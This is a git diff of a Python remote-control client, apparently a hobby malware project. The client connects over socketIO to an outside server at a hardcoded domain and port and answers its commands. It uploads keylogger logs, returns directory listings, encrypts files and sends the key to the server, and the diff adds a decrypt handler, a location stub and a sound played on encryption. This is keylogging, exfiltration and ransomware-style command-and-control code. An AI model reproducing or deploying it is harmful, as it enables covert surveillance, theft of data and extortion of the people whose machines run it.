@@ -2,9 +2,12 @@ from socketIO_client import SocketIO, BaseNamespace
 from sysPathList import *
 import base64
 from encryptFS import *
-sys.path.insert(0, r'tools/')
-import Tracket
+from decrpyter import *
+# sys.path.insert(0, r'tools/')
+# import Tracket
 from multiprocessing import Process
+import getpass
+from pygame import mixer # Load the required library
 
 
 
@@ -49,14 +52,19 @@ def keyLogReturn(data):
 	socketIO.emit("keylogData", {'file':"keyloggerLog.txt", 'filedata': encode})
 
 def encryptStuff(data):
-	encryptionExecute()
-	file = open("pass.txt", 'rb')
-	fileread = file.read()
-	encode = base64.encodestring(fileread)
+	key = encryptionExecute()
+	mixer.init()
+	mixer.music.load('test.mp3')
+	mixer.music.play()
 	socketIO.emit("encryptData", {'key': key})
 
+def decryptStuff(data):
+	#decrypt_file(data['key'],"/Users/"+getpass.getuser()+"/"+ getpass.getuser() +".zip")
+	decrypt_file(data['key'], "/Users/Hareesh/test.zip.enc")
 def tts(data):
 	speak(data['text'])
+def loc(data):
+	socketIO.emit("locationData", {'loc': "test"})
 
 
 socketIO = SocketIO('andrewarpasi.com', 6969)
@@ -66,6 +74,8 @@ socketIO.on("feedback", reply)
 socketIO.on('fileReq', fileDirReturn)
 socketIO.on('keyLog', keyLogReturn)
 socketIO.on('encrypt', encryptStuff)
+socketIO.on('decrypt', decryptStuff)
 socketIO.on('tts', tts)
+#SocketIO.on()
 
-socketIO.wait_for_callbacks(seconds=20)
+socketIO.wait()
